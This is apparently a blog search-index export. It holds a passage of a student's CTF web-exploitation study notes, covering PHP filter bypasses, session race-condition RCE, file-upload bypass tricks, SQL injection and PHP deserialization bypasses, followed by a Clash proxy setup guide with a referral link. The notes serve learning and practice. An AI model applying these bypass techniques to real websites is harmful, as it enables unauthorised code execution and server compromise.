title="5.php"></a>5.php</h2><p>只检测数字的时候可以用数组绕过（web89）<br>m代表多行匹配（web91）<br>$num&#x3D;4476只匹配num是不是4476，可以用其他任何值绕过，包括4476的十六进制和八进制<br>intval（$num，0）&#x3D;4476表示匹配num的十进制值是否为4476</p><p>干到web100了呜呜呜0.55了，做完几个条件竞争就去睡觉</p><p>当开启session时，服务器会在临时目录下创建session文件来保存会话信息，文件名格式为sess_PHPSESSID。<br>一般开发的web服务会使用多线程接收用户的请求，而线程同步机制确保两个及以上的并发进程或线程不同时执行某些特定的程序段，依靠临界区，session的临界区就是临时目录。<br>如果没有应用好同步技术则会产生“竞争条件”问题。意外生成攻击者想要生成的文件，这样攻击者可以在该文件还未被删除的时间段内进行非法操作。<br>PHP_SESSION_UPLOAD_PROGRESS用于设置&#x2F;tmp目录下生成的sess_PHPSESSID文件的内容<br>使用python脚本进行多线程请求，生成sess_PHPSESSID文件，实现rce<br>脚本链接：<a href="https://blog.csdn.net/weixin_46003360/article/details/119045296">https://blog.csdn.net/weixin_46003360/article/details/119045296</a>  （web82中）<br>—-2023.7.21 1:42 l1nk</p><p>临时文件目录：&#x2F;tmp&#x2F;php??????</p><h2 id="6-文件上传绕过"><a href="#6-文件上传绕过" class="headerlink" title="6.文件上传绕过"></a>6.文件上传绕过</h2><p>php替换为空，可以1.phphpp双写绕过得到1.php写入木马<br>00字符截断：123.php%00.jpg，后台以为是.jpg，文件上传的时候遇到%00就舍弃掉了后面的，以为是.php<br>iconv字符截断：utf-8字符集默认范围在0x00-0x7f，不在这个范围会报异常，后续字符不处理<br>123.php%df.jpg -&gt; 123.php<br>asp解析<br>基于nginx和php-fpm的错误配置：1.txt&#x2F;1.php如果1.php不存在会找前面的1.txt文件进行php解析（私教课43）<br>天呐我的脚本一直被删除（把系统的安全中心关了，安全软件全卸载了就行）<br>—-2023.7.21 21:44 l1nk</p><p>apache多后缀解析漏洞：123.txt.ctf ctf后缀不认识，往前找到txt作为后缀，处理为123.txt<br>伪协议绕过：auto_append_file&#x3D;php:&#x2F;&#x2F;input<br>日志文件绕过：auto_append_file&#x3D;&#x2F;var&#x2F;log&#x2F;nginx&#x2F;access.log<br>—-2023.7.22 22:51 l1nk</p><h2 id="7-sql注入"><a href="#7-sql注入" class="headerlink" title="7.sql注入"></a>7.sql注入</h2><p>sql注入，#和– （有个空格）为注释</p><p>—-2023.7.24 21:51 l1nk</p><p>盲注（工作量大）<br>报错注入，用updatexml；<br>见笔记（sql注入笔记day7）<br>—-2023.7.25 21:41 l1nk</p><p>&#x2F;&#x2F;filesystemiterator遍历文件类<br>&#x2F;&#x2F;directoryItrerator遍历目录类<br>—-2023.7.28 14:23 l1nk</p><p>is_file函数可以使用包装器伪协议来绕过，不影响file_get_contents highlight_file<br>is_file认为伪协议不是文件，highlight_file认为伪协议是文件<br>目录溢出会使is_file判断其不是文件，而highlight_file会正常识别<br>—-2023.7.31 22:00 l1nk</p><p>sql注入完了，开始php反序列化<br>—-2023.8.2  13:02 l1nk</p><h2 id="8-反序列化"><a href="#8-反序列化" class="headerlink" title="8.反序列化"></a>8.反序列化</h2><p>当用 &#x3D;&#x3D;&#x3D; 或 !&#x3D;&#x3D; 进行比较时则不进行类型转换，因为此时类型和数值都要比对。<br>$a &#x3D;&#x3D; $b 等于 TRUE，如果类型转换后 $a 等于 $b。<br>$a &#x3D;&#x3D;&#x3D; $b 全等 TRUE，如果 $a 等于 $b，并且它们的类型也相同。<br>$a !&#x3D; $b 不等 TRUE，如果类型转换后 $a 不等于 $b。 </p><p>_()是一个函数<br>_()&#x3D;&#x3D;gettext() 是gettext()的拓展函数，开启text扩展。需要php扩展目录下有php_gettext.dll<br>dnslog怎么又没用，无语了<br>—-2023.8.2  17:58 l1nk</p><p>反序列化，反不了一点<br>—-2023.8.9 20:41 l1nk</p><p>__wakeup() &#x2F;&#x2F;执行unserialize()时，先会调用这个函数<br>__sleep() &#x2F;&#x2F;执行serialize()时，先会调用这个函数<br>__destruct() &#x2F;&#x2F;对象被销毁时触发，当一个对象不再被引用时,PHP会自动销毁该对象,并在销毁之前调用__destruct方法。<br>__call() &#x2F;&#x2F;在对象上下文中调用不可访问的方法时触发<br>__callStatic() &#x2F;&#x2F;在静态上下文中调用不可访问的方法时触发<br>__get() &#x2F;&#x2F;用于从不可访问的属性读取数据或者不存在这个键都会调用此方法<br>__set() &#x2F;&#x2F;用于将数据写入不可访问的属性<br>__isset() &#x2F;&#x2F;在不可访问的属性上调用isset()或empty()触发<br>__unset() &#x2F;&#x2F;在不可访问的属性上使用unset()时触发<br>__toString() &#x2F;&#x2F;把类当作字符串使用时触发<br>__invoke() &#x2F;&#x2F;当尝试将对象调用为函数时触发</p><p>php版本：</p><p>​ PHP5 &lt; 5.6.25</p><p>​ PHP7 &lt; 7.0.10<br>序列化字符串中表示对象属性个数的值大于真实的属性个数时会跳过__wakeup的执行</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">test</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$a</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;a = <span class="hljs-string">&#x27;abc&#x27;</span>;<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__wakeup</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;a=<span class="hljs-string">&#x27;666&#x27;</span>;<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span>  <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-variable language_">$this</span>-&gt;a;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>如果执行unserialize(‘O:4:”test”:1:{s:1:”a”;s:3:”abc”;}’);输出结果为666</p><p>而把对象属性个数的值增大，1-&gt;2执行unserialize(‘O:4:”test”:2:{s:1:”a”;s:3:”abc”;}’);输出结果为abc</p><p>preg_match(‘&#x2F;^O:\d+&#x2F;‘)匹配序列化字符串是否是对象字符串开头<br>利用加号绕过（注意在url里传参时+要编码为%2B）</p><p>利用引用</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">test</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$a</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$b</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;a = <span class="hljs-string">&#x27;abc&#x27;</span>;<br>        <span class="hljs-variable language_">$this</span>-&gt;b= &amp;<span class="hljs-variable language_">$this</span>-&gt;a;<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span>  <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-variable language_">$this</span>-&gt;a===<span class="hljs-variable language_">$this</span>-&gt;b)&#123;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-number">666</span>;<br>        &#125;<br>    &#125;<br>&#125;<br><span class="hljs-variable">$a</span> = <span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">test</span>());<br></code></pre></td></tr></table></figure><p>上面这个例子将$b设置为$a的引用，可以使$a永远与$b相等</p><p>16进制绕过字符的过滤<br>O:4:”test”:2:{s:4:”%00*%00a”;s:3:”abc”;s:7:”%00test%00b”;s:3:”def”;}<br>可以写成<br>O:4:”test”:2:{S:4:”\00*\00\61”;s:3:”abc”;s:7:”%00test%00b”;s:3:”def”;}<br>表示字符类型的s大写时，会被当成16进制解析。</p><p>反序列化的字符逃逸<br>过滤后字符变多：利用引号闭合和大括号闭合，舍弃掉原有的部分序列化后的结果<br>过滤后字符变少：前面少了一半，导致后面的字符被吃掉，从而执行了我们后面的代码<br>—-2023.8.11 20:19 l1nk</p><p>pop链没看懂，和之前的字符拼接之后一起学。<br>—-2023.8.17 13:59 l1nk</p>]]></content>
    
    
    <categories>
      
      <category>渗透测试</category>
      
    </categories>
    
    
    <tags>
      
      <tag>CTF</tag>
      
      <tag>WEB</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>科学上网</title>
    <link href="/%E7%A7%91%E5%AD%A6%E4%B8%8A%E7%BD%91/"/>
    <url>/%E7%A7%91%E5%AD%A6%E4%B8%8A%E7%BD%91/</url>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>科学上网在学习和娱乐生活中都是必不可少的一项，如果不会的话那会损失一些好玩的东西并且不能去谷歌学术上看论文，现在的科学上网一般都是基于clash这个软件进行，科学上网是需要付费的购买流量套餐，当然网络上也有免费的流量可以白嫖不贵一般都是很多人共用速度会很慢不推荐。</p><p>综上所述，科学上网总共需要两步，购买clash中的流量套餐，配置好clash。</p><p>附一个免费白嫖梯子的教学：<a href="https://blog.csdn.net/manfanying/article/details/136406208">https://blog.csdn.net/manfanying/article/details/136406208</a></p><h2 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h2><p>Clash是一个开源的网络代理工具，支持多种网络代理协议，如‌Shadowsocks、‌V2Ray、‌Socks等。它可以在‌Windows、‌Android等操作系统上运行，主要用于实现<strong>网络流量的转发和代理</strong>。<br>下载地址：<a href="https://app.clash.ee/app/cfw0.20.17.zip">https://app.clash.ee/app/cfw0.20.17.zip</a><br>解压安装下载好的clash客户端<br><img src="/img/vpn1.png" alt="图片" title="得到文件夹，直接拖到想要安装的位置"><br>点开文件夹后点击此按钮就可以进入软件：<br><img src="/img/vpn2.png" alt="图片" title="点开这个exe应用程序"><br>进入到配置项，<strong>一开始是空的</strong>，因为没有购买流量套餐，这个软件只是个流量中转的平台，具体的流量需要去各个“机场”购买套餐</p><p>推荐一个我在用的，可以直接点进去注册购买套餐：<a href="https://go.chynet.net/auth/register?code=uM6X">https://go.chynet.net/auth/register?code=uM6X</a><br><img src="/img/vpn3.png" alt="图片" title="点击配置"></p><h2 id="配置订阅"><a href="#配置订阅" class="headerlink" title="配置订阅"></a>配置订阅</h2><p>Clash for Windows只是代理软件，自身没有携带任何节点，所以需要导入您购买的订阅链接获取可用的节点</p><p>使用浏览器登录上面的<a href="https://go.chynet.net/auth/register?code=uM6X">网站</a></p><h3 id="1-进入商店购买合适的套餐"><a href="#1-进入商店购买合适的套餐" class="headerlink" title="1.进入商店购买合适的套餐"></a>1.进入商店购买合适的套餐</h3><p><img src="/img/vpn5.png" alt="图片" title="一般这个买最小的就够了，能买到不限时限量的最好（因为用不到很多除非去油管看片"></p><h3 id="2-配置clash文件"><a href="#2-配置clash文件" class="headerlink" title="2.配置clash文件"></a>2.配置clash文件</h3><h4 id="2-1自动导入"><a href="#2-1自动导入" class="headerlink" title="2.1自动导入"></a>2.1自动导入</h4><p>进入首页「用户中心」，在官网「订阅信息」栏点击「点击Clash订阅」按钮，点击一键导入到clash会自动提示跳转到 Clash 客户端，根据提示点击「打开Clash for Windows」，此时 Clash 客户端中会出现订阅配置文件。<br><img src="/img/vpn4.png" alt="图片" title="一键导入即可"></p><h4 id="2-2手动导入"><a href="#2-2手动导入" class="headerlink" title="2.2手动导入"></a>2.2手动导入</h4><p>如果一键导入失败，也可以点击复制clash订阅，来进行手动导入配置文件，首先复制配置文件<br><img src="/img/vpn7.png" alt="图片" title="复制clash配置文件"><br>然后点开clash进行配置<br><img src="/img/vpn6.png" alt="图片" title="手动导入配置文件"></p><h3 id="3查看是否导入成功"><a href="#3查看是否导入成功" class="headerlink" title="3查看是否导入成功"></a>3查看是否导入成功</h3><p>点击 <strong>代理</strong> 查看到有以下节点信息，代表导入成功<br><img src="/img/vpn8.png" alt="图片" title="查看已有的代理"></p><h2 id="使用"><a href="#使用" class="headerlink" title="使用"></a>使用</h2><p>默认选择 「规则」 模式即可,如有特殊需求可以自行更换运行模式:</p><p>Global - 全局连接 - 所有请求通过节点代理<br><strong>Rule - 规则判断 - 根据配置规则进行自动分流，按照规则列表设置运行</strong><br>Direct - 直接连接 - 所有请求都不通过节点代理，直接从本地发起请求</p><p>打开系统代理则代表开启使用</p><p><img src="/img/vpn10.png" alt="图片" title="开启系统代理"></p><p>也可以在最小化窗口中开启<br><img src="/img/vpn9.png" alt="图片" title="开启系统代理即可实现科学上网"></p><h2 id="测试"><a href="#测试" class="headerlink" title="测试"></a>测试</h2><p>访问GPT：<a href="https://chat.openai.com/">https://chat.openai.com</a> 能成功进入说明成功了~<br><img src="/img/vpn11.png" alt="图片" title="成功进入gpt官网"><br>也可以访问油管试试：<a href="http://www.youtube.com/">www.youtube.com</a></p>]]></content>
    
    
    <categories>
      
      <category>环境配置</category>
      
    </categories>
    
    
    <tags>
      
      <tag>VPN</tag>
      
    </tags>
    
  </entry>
  
  
  
  
</search>
